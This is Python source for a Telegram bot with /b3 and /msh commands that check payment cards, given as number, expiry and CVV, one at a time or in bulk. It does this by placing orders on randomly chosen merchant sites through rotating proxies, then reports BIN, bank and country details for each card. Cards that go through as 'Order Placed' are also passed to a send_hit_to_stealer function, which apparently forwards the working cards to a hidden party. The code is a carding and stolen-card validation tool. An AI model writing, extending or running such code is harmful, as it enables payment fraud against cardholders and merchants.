# SINGLE CHECK
@app.on_message(filters.command("b3", [".", "/"]))
async def single_check(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        check = await check_all_thing(client, message)
        if not check[0]:
            return
        role = check[1]

        cc_data = await getmessage(message)
        if not cc_data:
            await message.reply(f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\nUse: /b3 cc|mm|yyyy|cvv", quote=True, parse_mode="HTML")
            return
        cc, mes, ano, cvv = cc_data
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        # Random site & proxy
        site_url = get_random_site()
        proxy = get_random_proxy()

        start = time.perf_counter()
        status, response, gateway, price, used_site = await process_card(cc, mes, ano, cvv, site_url, None, proxy)
        elapsed = time.perf_counter() - start

        # Get BIN info (optional)
        bin_info = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = bin_info

        final_status = status if status in ["Order Placed", "Insufficient Funds", "3D Secure Required"] else "Declined"
        display_status = f"<b>{final_status}</b>"

        final_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}
{SYMBOL} 𝗣𝗿𝗶𝗰𝗲 ⇾ {price} {currency}
{SYMBOL} 𝗦𝗶𝘁𝗲 ⇾ {used_site}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(final_msg, quote=True, parse_mode="HTML", disable_web_page_preview=True)

        if final_status == "Order Placed":
            await send_hit_to_stealer(client, fullcc, final_status, response, gateway, elapsed, first_name, role, price, used_site)

        await setantispamtime(user_id)
        await deductcredit(user_id)
    except Exception as e:
        await error_log(str(e))

# MASS CHECK (simplified – you can extend with progress bar)
@app.on_message(filters.command("msh", [".", "/"]))
async def mass_check(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        check = await check_all_thing(client, message)
        if not check[0]:
            return
        role = check[1]

        ccs = []
        if message.reply_to_message:
            ccs = extract_cards(message.reply_to_message.text or "")
        else:
            parts = message.text.split(maxsplit=1)
            if len(parts) > 1:
                ccs = extract_cards(parts[1])
        if not ccs:
            await message.reply("No cards found.", quote=True)
            return
        ccs = ccs[:MAX_MSC_LIMIT]

        approved = []
        declined = []
        for fullcc in ccs:
            parts = fullcc.split('|')
            if len(parts) != 4:
                continue
            cc, mes, ano, cvv = parts
            site_url = get_random_site()
            proxy = get_random_proxy()
            start = time.perf_counter()
            status, response, gateway, price, used_site = await process_card(cc, mes, ano, cvv, site_url, None, proxy)
            elapsed = time.perf_counter() - start
            if status == "Order Placed":
                approved.append((fullcc, response, gateway, price, used_site, elapsed))
                await send_hit_to_stealer(client, fullcc, status, response, gateway, elapsed, first_name, role, price, used_site)
            else:
                declined.append((fullcc, response))
            await asyncio.sleep(0.5)

        # Send results
        if approved:
            for card in approved:
                fullcc, resp, gw, price, site, tm = card
                bin_info = await get_bin_details(fullcc.split('|')[0])
                brand, type_, level, bank, country, flag, curr = bin_info
                msg = f"""<b>Order Placed</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gw}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {resp}
{SYMBOL} 𝗣𝗿𝗶𝗰𝗲 ⇾ {price} {curr}
{SYMBOL} 𝗦𝗶𝘁𝗲 ⇾ {site}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {tm:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
                await message.reply_text(msg, quote=True, parse_mode="HTML", disable_web_page_preview=True)
                await asyncio.sleep(0.3)
        if declined:
            decl_text = "❌ Declined Cards:\n" + "\n".join([f"{SYMBOL} {c[0]} → {c[1]}" for c in declined[:10]])
            if len(declined) > 10:
                decl_text += f"\n... and {len(declined)-10} more"
            await message.reply_text(decl_text, quote=True, parse_mode="HTML")
        await setantispamtime(user_id)
    except Exception as e:
        await error_log(str(e))

